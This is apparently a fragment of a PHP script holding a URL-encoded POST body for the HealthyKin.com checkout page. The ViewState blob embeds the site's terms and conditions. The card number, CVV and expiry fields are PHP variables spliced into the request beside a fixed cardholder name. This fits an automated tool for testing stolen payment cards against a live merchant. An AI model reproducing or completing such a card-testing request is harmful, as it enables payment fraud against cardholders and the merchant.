lhCVdpc2NvbnNpbgdXeW9taW5nFTMCQUwCQUsCQVoCQVICQ0ECQ08CQ1QCREUCREMCRkwCR0ECSEkCSUQCSUwCSU4CSUECS1MCS1kCTEECTUUCTUQCTUECTUkCTU4CTVMCTU8CTVQCTkUCTlYCTkgCTkoCTk0CTlkCTkMCTkQCT0gCT0sCT1ICUEECUkkCU0MCU0QCVE4CVFgCVVQCVlQCVkECV0ECV1YCV0kCV1kUKwMzZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnFgFmZAIbD2QWEGYPDxYEHg5TaG93Q1JFRElUQ0FSRGceEVNob3dQQVlQQUxFWFBSRVNTZ2QWCgICDxAPFgIeB0NoZWNrZWRnZGRkZAIEDw8WBB4IQ3NzQ2xhc3MFCGNjLWltYWdlHgRfIVNCAgJkZAIFDw8WBB8MBQhjYy1pbWFnZR8NAgJkZAIGDw8WBB8MBQhjYy1pbWFnZR8NAgJkZAIHDw8WBB8MBQhjYy1pbWFnZR8NAgJkZAIBD2QWAmYPFgIfAWVkAgIPZBYCAgEPFgIfAWVkAgQPDxYCHwBnZGQCBw9kFgICAw8QZGQWAGQCCQ8PFgIfAGhkZAILD2QWAgIBDxYCHwEFhEw8ZGl2IGNsYXNzPSJmb3JtIHRlcm1zLWZvcm0iPgk8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4JCTxpbnB1dCB0eXBlPSJjaGVja2JveCIgdmFsdWU9InRydWUiIGlkPSJUZXJtc0FuZENvbmRpdGlvbnNSZWFkIiBuYW1lPSJUZXJtc0FuZENvbmRpdGlvbnNSZWFkIiA%2BJm5ic3A7SSBhZ3JlZSB0byB0ZXJtcyBhbmQgY29uZGl0aW9ucyBiZWxvdwkJPGRpdiBjbGFzcz0iZm9ybS10ZXh0Ij48aDEgYWxpZ249Imp1c3RpZnkiPkhlYWx0aHlLaW4uY29tIFRlcm1zIGFuZCBDb25kaXRpb25zOjwvaDE%2BwrAgSGVhbHRoeUtpbi5jb20gdmFsdWVzIHlvdSBhcyBhIGN1c3RvbWVyIGFuZCB5b3VyIHJpZ2h0IHRvIHByaXZhY3kuIEV4Y2VwdCBhcyBtYXkgYmUgb3RoZXJ3aXNlIHJlcXVpcmVkIGJ5IGxhdywgSGVhbHRoeUtpbi5jb20gd2lsbCBleGVyY2lzZSBjb21tZXJjaWFsbHkgcmVhc29uYWJsZSBlZmZvcnRzIHRvIGVuc3VyZSB0aGF0IHlvdXIgcGVyc29uYWwgaW5mb3JtYXRpb24gcmVtYWlucyBjb25maWRlbnRpYWwgYW5kIGF2YWlsYWJsZSBvbmx5IHRvIEhlYWx0aHlLaW4uY29tLCBhbmQgaXRzIGVtcGxveWVlcywgYWdlbnRzLCBhbmQgY29udHJhY3RvcnMuIEhlYWx0aHlLaW4uY29tIHdpbGwgbm90IHNlbGwgeW91ciBwZXJzb25hbCBpbmZvcm1hdGlvbiB0byB0aGlyZCBwYXJ0aWVzLiA8YnI%2BPGJyPsKwIEl0IGlzIHlvdXIgcmVzcG9uc2liaWxpdHkgdG8gcHJvbXB0bHkgbm90aWZ5IHlvdXIgYmFuayBvZiBhbnkgY2hhbmdlcyB0byB5b3VyIGJpbGxpbmcgaW5mb3JtYXRpb24sIG9yIG9mIGFueSBsb3NzLCB0aGVmdCwgb3IgdW5hdXRob3JpemVkIHVzZSBvZiB5b3VyIGNyZWRpdCBjYXJkIG51bWJlci4gWW91IGFyZSByZXNwb25zaWJsZSBmb3IgdXBkYXRpbmcgeW91ciByZWdpc3RyYXRpb24gaW5mb3JtYXRpb24gYW5kIHlvdXIgY3JlZGl0IGNhcmQgaW5mb3JtYXRpb24sIGFzIGFwcGxpY2FibGUuIDxicj48YnI%2BwrAgTm90d2l0aHN0YW5kaW5nIGFueSBzdGF0ZW1lbnRzIG9uIHRoZSB3ZWIgcGFnZXMgb3IgdGhlc2UgYnVsbGV0IHBvaW50cywgdGhlIFRlcm1zIGFuZCBDb25kaXRpb25zIGFyZSB0aGUgYWdyZWVtZW50IGJldHdlZW4geW91IGFuZCBIZWFsdGh5S2luLmNvbS4gQnkgc3VibWl0dGluZyBlYWNoIG9yZGVyIGF0IGNoZWNrb3V0LCB5b3UgY29uZmlybSBhbmQgYWZmaXJtIHRoYXQgeW91IGhhdmUgcmVhZCwgdW5kZXJzdG9vZCBhbmQgYWdyZWUgdG8gdGhlIFRlcm1zIGFuZCBDb25kaXRpb25zLCBvZiB0aGUgZm9ybSBpbiB3aGljaCB0aGV5IGFwcGVhciBhdCB0aGUgdGltZSB0aGUgb3JkZXIgaXMgc3VibWl0dGVkIGF0IGNoZWNrb3V0LiA8YnI%2BPGJyPjEuIE9mZmVyIGFuZCBhY2NlcHRhbmNlLiBCeSBzdWJtaXR0aW5nIGEgY29tcGxldGVkIG9yZGVyIGZvcm0sIHlvdSBvZmZlciB0byBwdXJjaGFzZSwgb24gYW5kIHB1cnN1YW50IHRvIHRoZXNlIFRlcm1zIGFuZCBDb25kaXRpb25zIGFuZCB0aGUgb3JkZXIgZm9ybSwgdGhlIHByb2R1Y3RzIGFuZCBvdGhlciBpdGVtcyAoY29sbGVjdGl2ZWx5LCAmcXVvdDtQcm9kdWN0JnF1b3Q7KSB5b3Ugc2VsZWN0IGFuZCBzdWJtaXQgdG8gSGVhbHRoeUtpbi5jb20sIExMQy4gKCZxdW90O0hlYWx0aHlLaW4uY29tJnF1b3Q7KSBmb3IgcHVyY2hhc2UgdmlhIHRoZSBvcmRlciBmb3JtLiBZb3VyIG9mZmVyIG1heSBiZSBhY2NlcHRlZCBieSBIZWFsdGh5S2luLmNvbSBieSBzZW5kaW5nIHlvdSBhbiBlbGVjdHJvbmljIGNvbmZpcm1hdGlvbiB0aGF0IHlvdXIgb3JkZXIgaGFzIGJlZW4gcmVjZWl2ZWQgYW5kIGFjY2VwdGVkLiBJdCBzaGFsbCBiZSBpbiBIZWFsdGh5S2luLmNvbSdzIGRpc2NyZXRpb24gdG8gYWNjZXB0IG9yIHJlamVjdCB5b3VyIG9mZmVyLiBJZiBIZWFsdGh5S2luLmNvbSBhY2NlcHRzIHlvdXIgb2ZmZXIsIHRoZXNlIFRlcm1zIGFuZCBDb25kaXRpb25zIGFuZCB0aGUgb3JkZXIgZm9ybSBjb2xsZWN0aXZlbHkgY29uc3RpdHV0ZSBhIGxlZ2FsIGFncmVlbWVudCBiZXR3ZWVuIEhlYWx0aHlLaW4uY29tIGFuZCB5b3UgZ292ZXJuaW5nIHlvdXIgcHVyY2hhc2Ugb2YgdGhlIFByb2R1Y3QgZnJvbSBIZWFsdGh5S2luLmNvbSBvdmVyIHRoZSBvbmxpbmUgc2hvcHBpbmcgc2VydmljZS48YnI%2BPGJyPjIuIFJlc3BvbnNpYmlsaXRpZXMuIElmIEhlYWx0aHlLaW4uY29tIGFjY2VwdHMgeW91ciBvcmRlciwgSGVhbHRoeUtpbi5jb20gc2hhbGwsIGluIHJldHVybiBmb3IgeW91ciBwYXltZW50LCBwcm92aWRlIHRoZSBQcm9kdWN0IHdoaWNoIHlvdSBvcmRlciB0aHJvdWdoIHRoZSBvbmxpbmUgc2hvcHBpbmcgc2VydmljZS4gVGhlIFByb2R1Y3Qgc2hhbGwgYmUgZGVsaXZlcmVkIHRvIHlvdSBhdCB0aGUgZGVsaXZlcnkgYWRkcmVzcyB5b3UgZGVzaWduYXRlLiBZb3VyIHBheW1lbnQgZm9yIHRoZSBQcm9kdWN0IGFuZCBzaGlwcGluZywgaW5jbHVkaW5nIHNhbGVzIHRheGVzIGFuZCBhc3Nlc3NtZW50cywgaXMgZHVlIHVwb24gY29tcGxldGlvbiBvZiB5b3VyIG9yZGVyIG9uLWxpbmUuIEhlYWx0aHlLaW4uY29tIHdpbGwgY2hhcmdlIHRoZSBwYXltZW50IHRvIHRoZSBjcmVkaXQgY2FyZCB3aGljaCB5b3Ugc3VibWl0IHRvIEhlYWx0aHlLaW4uY29tLCBhbmQgd2lsbCBjb2xsZWN0IHRoZSBwYXltZW50IGZyb20geW91ciBiYW5rLiBZb3UgYXV0aG9yaXplIEhlYWx0aHlLaW4uY29tIHRvIG1ha2UgYW5kIGNvbGxlY3Qgc3VjaCBjaGFyZ2UsIGFuZCBhZ3JlZSB0byBtYWtlIHBheW1lbnQgdG8gSGVhbHRoeUtpbi5jb20gaWYgSGVhbHRoeUtpbi5jb20gY2Fubm90IGNvbGxlY3QgdGhlIGNoYXJnZSBmb3IgYW55IHJlYXNvbi4gVGhlIHRvdGFsIGFtb3VudHMgeW91IHNoYWxsIHBheSBmb3IgdGhlIFByb2R1Y3QgcGVyIGVhY2ggb3JkZXIgc2hhbGwgYmUgdGhlIHN1bXMgb2YgdGhlIHJlc3BlY3RpdmUgcHJpY2VzIGZvciB0aGUgaXRlbXMgeW91IHNlbGVjdCBhbmQgc3VibWl0IHZpYSB0aGUgb3JkZXIgZm9ybSwgcGx1cyBhbGwgYXBwbGljYWJsZSBzYWxlcyB0YXhlcyBhbmQgc2hpcHBpbmcgY2hhcmdlcywgYXMgcmVwb3J0ZWQgdG8geW91IGFzIHRoZSAmcXVvdDtUT1RBTCZxdW90OyBpbiB0aGUgb3JkZXIgZm9ybS4gPGJyPjxicj4zLiBQcm9kdWN0IFByaWNpbmcgYW5kIFNoaXBwaW5nIENoYXJnZXMuIFlvdSB3aWxsIGJlIGNoYXJnZWQgdGhlIHByaWNlcyBxdW90ZWQgZm9yIFByb2R1Y3RzIHlvdSBoYXZlIHNlbGVjdGVkIGZvciBwdXJjaGFzZSBhdCB0aGUgdGltZSB5b3Ugc3VibWl0IHlvdXIgb3JkZXIgYXQgY2hlY2tvdXQuIFNoaXBwaW5nIGNoYXJnZXMgbWF5IGFsc28gY2hhbmdlIGZyb20gdGltZSB0byB0aW1lLCBob3dldmVyOyB5b3Ugd2lsbCBiZSBjaGFyZ2VkIHRoZSBzaGlwcGluZyBjaGFyZ2VzIHF1b3RlZCBhdCB0aGUgdGltZSB5b3Ugc3VibWl0IHlvdXIgb3JkZXIgYXQgY2hlY2tvdXQuIDxicj48YnI%2BNC4gQ29tbXVuaWNhdGlvbnMuIEhlYWx0aHlLaW4uY29tIHNoYWxsIGNvbmNsdXNpdmVseSBwcmVzdW1lIHRoYXQgb25saW5lIGNvbW11bmljYXRpb25zIHJlY2VpdmVkIGZyb20geW91IHRocm91Z2ggeW91ciB1c2Ugb2YgdGhlIG9ubGluZSBvcmRlciBmb3JtIGFuZCByZWdpc3RyYXRpb24gcHJvY2VzcyBhcmUgYWNjdXJhdGUsIGNvbXBsZXRlLCBhbmQgYXV0aG9yaXplZCBieSB5b3UgYXMgcmVjZWl2ZWQgYnkgSGVhbHRoeUtpbi5jb20uIFlvdSBhZ3JlZSBub3QgdG8gY29udGVzdCB0aGUgdmFsaWRpdHkgYW5kIGJpbmRpbmcgbGVnYWwgZWZmZWN0IG9mIHRob3NlIGNvbW11bmljYXRpb25zLiA8YnI%2BPGJyPjUuIFNob3BwZXIgcmVnaXN0cmF0aW9uLiBZb3UgYWdyZWUgdG8gY29tcGxldGUgdGhlIGluaXRpYWwgcmVnaXN0cmF0aW9uIHByb2Nlc3MgYWNjb3JkaW5nIHRvIEhlYWx0aHlLaW4uY29tJ3MgcmVxdWlyZW1lbnRzIHN0YXRlZCBvbiB0aGUgV2ViIHNpdGUsIGFuZCB0byBwcm92aWRlIEhlYWx0aHlLaW4uY29tIHdpdGggYWNjdXJhdGUsIGNvbXBsZXRlIGFuZCB1cGRhdGVkIGluZm9ybWF0aW9uIGFzIHJlcXVpcmVkIGZvciB0aGUgaW5pdGlhbCByZWdpc3RyYXRpb24gcHJvY2VzcywgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHlvdXIgbGVnYWwgbmFtZSwgYmlsbGluZyBhbmQgZGVsaXZlcnkgYWRkcmVzc2VzLCBhbmQgdGVsZXBob25lIG51bWJlci4gWW91IG11c3QgcHJvdmlkZSBIZWFsdGh5S2luLmNvbSB3aXRoIGFuIGFjY3VyYXRlIGFuZCBjb21wbGV0ZSBjcmVkaXQgY2FyZCBudW1iZXIgYW5kIGV4cGlyYXRpb24gZGF0ZSBhdCB0aGUgdGltZSBvZiBzdWJtaXR0aW5nIHlvdXIgb25saW5lIHB1cmNoYXNlIG9yZGVyLiBZb3UgcmVwcmVzZW50IGFuZCB3YXJyYW50IHRvIEhlYWx0aHlLaW4uY29tIHRoYXQgeW91ciB1c2Ugb2YgYW55IGNyZWRpdCBjYXJkIGlzIGF1dGhvcml6ZWQgYW5kIGxlZ2FsLiA8YnI%2BPGJyPjYuIFNob3BwZXIgaW5mb3JtYXRpb24gY2hhbmdlcy4gSXQgaXMgeW91ciByZXNwb25zaWJpbGl0eSB0byBwcm9tcHRseSBub3RpZnkgeW91ciBiYW5rIG9mIGFueSBjaGFuZ2VzIHRvIHlvdXIgYmlsbGluZyBpbmZvcm1hdGlvbiBvciBsb3NzLCB0aGVmdCwgb3IgdW5hdXRob3JpemVkIHVzZSBvZiB5b3VyIGNyZWRpdCBjYXJkIG51bWJlci4gWW91IGFyZSByZXNwb25zaWJsZSBmb3IgdXBkYXRpbmcgeW91ciByZWdpc3RyYXRpb24gaW5mb3JtYXRpb24gYW5kIHlvdXIgY3JlZGl0IGNhcmQgaW5mb3JtYXRpb24sIGFzIGFwcGxpY2FibGUuPGJyPjxicj43LiBTdWJzdGl0dXRpb24gUG9saWN5LiBBbHRob3VnaCBIZWFsdGh5S2luLmNvbSBiZWxpZXZlcyB0aGF0IGl0IHdpbGwgaGF2ZSBzdWZmaWNpZW50IGludmVudG9yeSB0byBmaWxsIHlvdXIgb3JkZXJzLCBpdCBpcyBwb3NzaWJsZSB0aGF0IGNlcnRhaW4gUHJvZHVjdHMgbWF5IGJlIHVuYXZhaWxhYmxlLCBmcm9tIHRpbWUgdG8gdGltZS4gSW4gdGhlIGV2ZW50IGFuIGl0ZW0geW91IGhhdmUgb3JkZXJlZCBpcyB0ZW1wb3JhcmlseSB1bmF2YWlsYWJsZSwgSGVhbHRoeUtpbi5jb20gd2lsbCBhdHRlbXB0IHRvIG5vdGlmeSB5b3UuIDxicj48YnI%2BOC4gUHJvZHVjdCBJbmZvcm1hdGlvbi4gSGVhbHRoeUtpbi5jb20gd2lsbCBhdHRlbXB0IHRvIHVwZGF0ZSBQcm9kdWN0IHNwZWNpZmljYXRpb25zIGFuZCBvdGhlciBQcm9kdWN0IGluZm9ybWF0aW9uIGFzIGFuZCB3aGVuIGNoYW5nZXMgY29tZSB0byB0aGUgYXR0ZW50aW9uIG9mIEhlYWx0aHlLaW4uY29tLiBIb3dldmVyLCBIZWFsdGh5S2luLmNvbSBpcyBub3QgcmVzcG9uc2libGUgZm9yIGFueSBpbmFjY3VyYWN5IG9yIG1pc3N0YXRlbWVudCBvZiBhbnkgc3VjaCBpbmZvcm1hdGlvbi4gWW91IHNob3VsZCByZWFkIHRoZSBQcm9kdWN0IGluZm9ybWF0aW9uIHVwb24gZGVsaXZlcnkgb3IgY29udGFjdCB0aGUgcHJvZHVjdCBtYW51ZmFjdHVyZXIuIDxicj48YnI%2BOS4gRGlzY2xhaW1lciBvZiB3YXJyYW50eS4gSGVhbHRoeUtpbi5jb20gb25saW5lIHNob3BwaW5nIHNlcnZpY2VzIGFyZSBwcm92aWRlZCBvbiBhcyAmcXVvdDtBUyBJUyZxdW90OywgJnF1b3Q7QVMgQVZBSUxBQkxFJnF1b3Q7IGJhc2lzLCBhbmQgSGVhbHRoeUtpbi5jb20gZG9lcyBub3QgcHJvdmlkZSBhbnkgYXNzdXJhbmNlcyBvZiB0aGUgYXZhaWxhYmlsaXR5IG9yIHVzYWJpbGl0eSBieSB5b3Ugb2YgdGhlIG9ubGluZSBzaG9wcGluZyBzZXJ2aWNlcy4gSGVhbHRoeUtpbi5jb20gbWFrZXMgbm8gcmVwcmVzZW50YXRpb25zIG9yIHdhcnJhbnRpZXMsIHdoYXRzb2V2ZXIsIGFzIHRvIHRoZSBzdWJzdGFuY2UsIG9yIHRoZSBhY2N1cmFjeSBvciBzdWZmaWNpZW5jeSB0aGVyZW9mLCBvZiBhbnkgUHJvZHVjdCBpbmZvcm1hdGlvbiBsaXN0ZWQgb24gdGhlIHdlYiBzaXRlLiBIZWFsdGh5S2luLmNvbSBNQUtFUyBOTyBXQVJSQU5USUVTLCBFWFBSRVNTIE9SIElNUExJRUQsIElOQ0xVRElORyBXSVRIT1VUIExJTUlUQVRJT04gTk8gSU1QTElFRCBXQVJSQU5USUVTIE9GIE1FUkNIQU5UQUJJTElUWSBPUiBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRSwgQVMgVE8gVEhFIFBST0RVQ1RTIFNPTEQsIFRIRSBPTkxJTkUgU0hPUFBJTkcgU0VSVklDRVMsIERFTElWRVJJRVMsIE9SIE9USEVSV0lTRS4gPGJyPjxicj4xMC4gTGltaXRhdGlvbiBvZiBsaWFiaWxpdHkuIEhlYWx0aHlLaW4uY29tIHNoYWxsIG5vdCBiZSBsaWFibGUgdG8geW91IGZvciBhbnkgaW50ZXJjZXB0aW9uIG9mIG9ubGluZSBjb21tdW5pY2F0aW9ucywgc29mdHdhcmUgb3IgaGFyZHdhcmUgcHJvYmxlbXMgKGluY2x1ZGluZywgd2l0aG91dCBsaW1pdGF0aW9uLCB2aXJ1c2VzLCBsb3NzIG9mIGRhdGEsIG9yIGNvbXBhdGliaWxpdHkgY29uZmxpY3RzKSwgdW5hdXRob3JpemVkIHVzZSBvZiB5b3VyIGNyZWRpdCBjYXJkLCBvciBvdGhlciBjb25zZXF1ZW5jZSBiZXlvbmQgdGhlIHJlYXNvbmFibGUgY29udHJvbCBvZiBIZWFsdGh5S2luLmNvbS4gQW55IGxpYWJpbGl0eSBvZiBIZWFsdGh5S2luLmNvbSwgaXRzIGVtcGxveWVlcywgYWZmaWxpYXRlcywgb3IgYWdlbnRzLCB0byB5b3UgZm9yIGRhbWFnZXMsIGxvc3NlcyBhbmQgY2F1c2VzIG9mIGFjdGlvbiwgd2hldGhlciBpbiBjb250cmFjdCwgdG9ydCwgb3Igb3RoZXJ3aXNlLCBlaXRoZXIgam9pbnRseSBvciBzZXZlcmFsbHksIHNoYWxsIGJlIHN0cmljdGx5IGxpbWl0ZWQgdG8gdGhlIGFnZ3JlZ2F0ZSBkb2xsYXIgYW1vdW50IHBhaWQgYnkgeW91IHRvIEhlYWx0aHlLaW4uY29tIGluIHRoZSB0d2VsdmUgKDEyKSBtb250aHMgKG9yLCBpZiBsZXNzLCBzdWNoIHNob3J0ZXIgcGVyaW9kIG9mIHlvdXIgdXNlIG9mIHRoZSBvbmxpbmUgc2hvcHBpbmcgc2VydmljZSkgaW1tZWRpYXRlbHkgcHJpb3IgdG8gdGhlIGNsYWltZWQgaW5qdXJ5IG9yIGRhbWFnZS4gPGJyPjxicj4xMS4gQ29uZmlkZW50aWFsaXR5LiBIZWFsdGh5S2luLmNvbSB2YWx1ZXMgeW91IGFzIGEgY3VzdG9tZXIgYW5kIHlvdXIgcmlnaHQgdG8gcHJpdmFjeS4gRXhjZXB0IGFzIG1heSBiZSBvdGhlcndpc2UgcmVxdWlyZWQgYnkgbGF3LCBIZWFsdGh5S2luLmNvbSAoaSkgd2lsbCBleGVyY2lzZSBjb21tZXJjaWFsbHkgcmVhc29uYWJsZSBlZmZvcnRzIHRvIGVuc3VyZSB0aGF0IHlvdXIgY3JlZGl0IGNhcmQgaW5mb3JtYXRpb24gcmVtYWlucyBjb25maWRlbnRpYWwgYW5kIGlzIGF2YWlsYWJsZSBvbmx5IHRvIHBlcnNvbm5lbCB3aG8gaGF2ZSBhIG5lZWQgdG8ga25vdyBzdWNoIGluZm9ybWF0aW9uIGluIGNvbm5lY3Rpb24gd2l0aCBwcm92aWRpbmcgeW91IHdpdGggSGVhbHRoeUtpbi5jb20ncyBvbmxpbmUgc2hvcHBpbmcgc2VydmljZXMgb3Igb3RoZXJ3aXNlIGZvciBIZWFsdGh5S2luLmNvbSdzIGdlbmVyYWwgYnVzaW5lc3MgcHVycG9zZXMgYW5kIChpaSkgd2lsbCBub3Qgc2VsbCB5b3VyIG5hbWUsIGFkZHJlc3Mgb3Igc2ltaWxhciBwZXJzb25hbCBpbmZvcm1hdGlvbiB0byB0aGlyZCBwYXJ0aWVzIG9yIHBlcm1pdCB0aGUgdXNlIG9mIHN1Y2ggaW5mb3JtYXRpb24gb3V0c2lkZSB0aGUgc2NvcGUgb2YgdGhlIEhlYWx0aHlLaW4uY29tIG9ubGluZSBzaG9wcGluZyBzZXJ2aWNlIG9yIEhlYWx0aHlLaW4uY29tJ3MgZ2VuZXJhbCBidXNpbmVzcyBwdXJwb3Nlcy4gSGVhbHRoeUtpbi5jb20gbWF5LCBhbmQgcmVzZXJ2ZXMgdGhlIHJpZ2h0IHRvLCB1c2UgYW5kIGRpc2Nsb3NlIGludGVybmFsbHkgd2l0aGluIEhlYWx0aHlLaW4uY29tIGFueSBhZ2dyZWdhdGVkIGluZm9ybWF0aW9uLCBpbmNsdWRpbmcgaW5mb3JtYXRpb24geW91IHByb3ZpZGUgdG8gSGVhbHRoeUtpbi5jb20sIHJlZ2FyZGluZyBIZWFsdGh5S2luLmNvbSBjdXN0b21lcnMgYW5kIHVzYWdlIG9mIHRoZSBvbmxpbmUgc2hvcHBpbmcgc2VydmljZSwgZm9yIGFueSBwdXJwb3NlLjxicj48YnI%2BMTIuIEFwcGxpY2FibGUgbGF3LiBUaGVzZSBUZXJtcyBhbmQgQ29uZGl0aW9ucyBhbmQgdGhlIG9yZGVyIGZvcm0sIGNvbGxlY3RpdmVseSBjb25zdGl0dXRpbmcgdGhlIHNvbGUgYW5kIGVudGlyZSBhZ3JlZW1lbnQgYmV0d2VlbiBIZWFsdGh5S2luLmNvbSBhbmQgeW91IHJlZ2FyZGluZyB0aGUgb25saW5lIHNob3BwaW5nIHNlcnZpY2VzLCBhcmUgZ292ZXJuZWQgYnkgbGF3cyBvZiB0aGUgU3RhdGUgb2YmbmJzcDsgQXJpem9uYSB3aXRob3V0IHJlZ2FyZCB0byBjb25mbGljdCBvZiBsYXdzIHJ1bGVzLiBUaGUgcGFydGllcyBhZ3JlZSB0byBqdXJpc2RpY3Rpb24gYW5kIHZlbnVlIGZvciBhbnkgZGlzcHV0ZSBoZXJldW5kZXIgc29sZWx5IGluIFBlb3JpYSwgQXJpem9uYS4gPGJyPjxicj4xMy4gQ2hhbmdlcyB0byBUZXJtcyBhbmQgQ29uZGl0aW9ucy4gSGVhbHRoeUtpbi5jb20gcmVzZXJ2ZXMgdGhlIHJpZ2h0IHRvLCBmcm9tIHRpbWUgdG8gdGltZSwgd2l0aCBvciB3aXRob3V0IG5vdGljZSB0byB5b3UsIGluIEhlYWx0aHlLaW4uY29tJ3Mgc29sZSBkaXNjcmV0aW9uLCBhbWVuZCB0aGUgVGVybXMgYW5kIENvbmRpdGlvbnMgZm9yIHVzZSBhbmQgcHVyY2hhc2VzIHJlZ2FyZGluZyB0aGUgb25saW5lIHNob3BwaW5nIHNlcnZpY2VzLiBBbnkgYW1lbmRtZW50cyBieSBIZWFsdGh5S2luLmNvbSB3aWxsIGJlIGVmZmVjdGl2ZSBvbmx5IGFzIHRvIG9yZGVycyB5b3UgcGxhY2Ugc3Vic2VxdWVudCB0byBIZWFsdGh5S2luLmNvbSdzIHJldmlzaW9ucyBvZiB0aGVzZSBUZXJtcyBhbmQgQ29uZGl0aW9ucyBvbiB0aGUgd2ViIHNpdGUgdG8gcmVmbGVjdCB0aGUgYW1lbmRtZW50cy4gSXQgaXMgeW91ciByZXNwb25zaWJpbGl0eSB0byByZXZpZXcgdGhlIFRlcm1zIGFuZCBDb25kaXRpb25zIHByaW9yIHRvIHN1Ym1pdHRpbmcgZWFjaCBvcmRlciBhbmQgSGVhbHRoeUtpbi5jb20gaGFzIG5vIHJlc3BvbnNpYmlsaXR5IHRvIG5vdGlmeSB5b3Ugb2YgYW55IGNoYW5nZXMgcHJpb3IgdG8gZWZmZWN0aXZlbmVzcyBvZiB0aGUgY2hhbmdlcyBvciBvdGhlcndpc2UuIDxicj48YnI%2BMTQuIFRlcm1zIGFuZCBDb25kaXRpb25zIEdvdmVybi4gVGhlc2UgVGVybXMgYW5kIENvbmRpdGlvbnMsIGFzIGFtZW5kZWQgZnJvbSB0aW1lIHRvIHRpbWUsIHNoYWxsIGJlIHRoZSBzb2xlIHRlcm1zIG9mIHRoZSBhZ3JlZW1lbnQgYmV0d2VlbiB5b3UgYW5kIEhlYWx0aHlLaW4uY29tIHJlZ2FyZGluZyB5b3VyIG9ubGluZSBwdXJjaGFzZXMuIEFsbCBzdGF0ZW1lbnRzIG90aGVyd2lzZSBtYWRlIG9uIHRoZSB3ZWIgc2l0ZSBhcmUgaW50ZW5kZWQgb25seSBmb3IgeW91ciBjb252ZW5pZW5jZSBhbmQgZG8gbm90IGZvcm0gYW5kIGFyZSBub3QgaW5jbHVkZWQgaW4gdGhlIHRlcm1zIGZvciB5b3VyIHB1cmNoYXNlLiA8YnI%2BPGJyPjE1LiBUYXhlcy4gSWYgeW91IGJlY29tZSBhd2FyZSBvZiBhbnkgdW5wYWlkIHNhbGVzIHRheGVzIG9yIG90aGVyIGFtb3VudHMgd2l0aCByZXNwZWN0IHRvIGFueSBwdXJjaGFzZXMsIHlvdSBtdXN0IGV4cGVkaXRpb3VzbHkgcmVwb3J0IHRoaXMgdG8gSGVhbHRoeUtpbi5jb20gYW5kIHlvdSBtdXN0IHRpbWVseSBwYXkgc3VjaCB0YXhlcyBvciBhbW91bnRzLiA8YnI%2BPGJyPjE2LiBIZWFsdGh5S2luLmNvbSdzIFJpZ2h0IHRvIFJlZnVzZSBTZXJ2aWNlLiBIZWFsdGh5S2luLmNvbSwgaW4gaXRzIHNvbGUgZGlzY3JldGlvbiwgcmVzZXJ2ZXMgdGhlIHJpZ2h0IHRvIHJlZnVzZSBzZXJ2aWNlIHRvIGFueW9uZSwgd2l0aCBvciB3aXRob3V0IGNhdXNlIG9yIHJlYXNvbi48L2gxPgkJPC9kaXY%2BCTwvZGl2PjwvZGl2PgpkAg0PZBYCAgEPDxYCHghJbWFnZVVybGVkZAIdD2QWBgIFDxYCHwEFGDxkaXYgYWxpZ249ImxlZnQiPjwvZGl2PmQCBw8PFgQeCEVkaXRNb2RlaB8AaGRkAgkPDxYCHhZTa2lwU2hpcHBpbmdPbkNoZWNrb3V0aGRkAg8PZBYCAgEPDxYCHwBoZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFMGN0bDAwJFBhZ2VDb250ZW50JGN0cmxQYXltZW50TWV0aG9kJHJiQ1JFRElUQ0FSRAUzY3RsMDAkUGFnZUNvbnRlbnQkY3RybFBheW1lbnRNZXRob2QkcmJQQVlQQUxFWFBSRVNTBTNjdGwwMCRQYWdlQ29udGVudCRjdHJsUGF5bWVudE1ldGhvZCRyYlBBWVBBTEVYUFJFU1PwgTcE%2BE%2FGDeBZMwR49d%2FBsrQKYQ%3D%3D&__VIEWSTATEGENERATOR=12D76D2B&__EVENTVALIDATION=%2FwEdACjC%2BOn6E3fvyjAXPToYQFcaQmGOQRM2m7xhsXBxfZnU21PVuOZ8FqfIUtfDo%2BjhFiFj3QsIJ9MlTOiytfLlTttlCu5OcwpEYuS0J6jQVitGh7QiWMJCvY0uU1WKETCxewcsyG1WLPYb%2FrUrBj0Wg4iqg1QkgqwTFnCUc7OyHhR2TM8%2FEZ3l1%2FWZEcQi4D38%2Baq52UVgQYNzxbqaLyX8v37vvLnEJFWVdkLNJAF%2BPS7fu5%2BZVviqnBAQH%2F2Yy%2Fvi2zT2zWJi2PPmekGXWXKZc%2FxfzxEz41Hgkiafqm6iVdsRcPWHTT6FjcO1kJLkq9Gcjb2AUUgFhUByd85eJkFylLqjODfLChK2yvpjYhqdmEk%2BP57aibsCrd66SatTuL%2BuHmkwygy2Cq2F9GDSodINPtJZzLSbDjxIq1TRB6If6ckDEdQnJU%2FP%2BLwCkKd7hnK%2BYiSexyndD5E2b4KPy8kLMaHV5YxdiPi81rI1YzpMAXERZt4oFg2MgUY%2FhMhR5v8BUl7m%2FO4Tk5dLgw62RPFQ2MYNc4QYMX1G9YVGDflq7gg%2FL1CHMK3RQ%2BOxuxvdDir%2FMvR%2Br4ZTzybRLU%2BEsVAVKNSZW7M789Ca%2BmyPHTebGsIVZRyLfWNsGg9nbu5C%2FFzDDYnF%2Bo3mNq1SivP%2F%2Bl7e3629TFODak6YovQEIikguGeG1wB0csNeiGnTmRyAIFM5DE9n6nB9EnY89vcMOe%2BzCKAhFuu7453lm1ELjUbGXGPnA4YlW8XYDQ8wG8DxtEC%2B2E9d%2BbuTL4T7gt2QpWmg%2Bx%2B6MNoyFKnReGcOuI6YTxV6RG%2FPYaP9k1%2FbajwR5bOldTN7dYSDb%2F2FinZwgETXGveUwNtYgT9FIhs%2B3NKKSAo9IfvHZDU%3D&ctl00%24PageContent%24ddlChooseBillingAddr=3292462&ctl00%24PageContent%24ctrlPaymentMethod%24PaymentSelection=rbCREDITCARD&ctl00%24PageContent%24ctrlCreditCardPanel%24txtCCName=Everaldo+Moraes&ctl00%24PageContent%24ctrlCreditCardPanel%24txtCCNumber='.$cc.'&ctl00%24PageContent%24ctrlCreditCardPanel%24txtCCVerCd='.$cvv.'&ctl00%24PageContent%24ctrlCreditCardPanel%24ddlCCType=MasterCard&ctl00%24PageContent%24ctrlCreditCardPanel%24ddlCCExpMonth='.$mes.'&ctl00%24PageContent%24ctrlCreditCardPanel%24ddlCCExpYr='.$ano.'&ctl00%24PageContent%24bt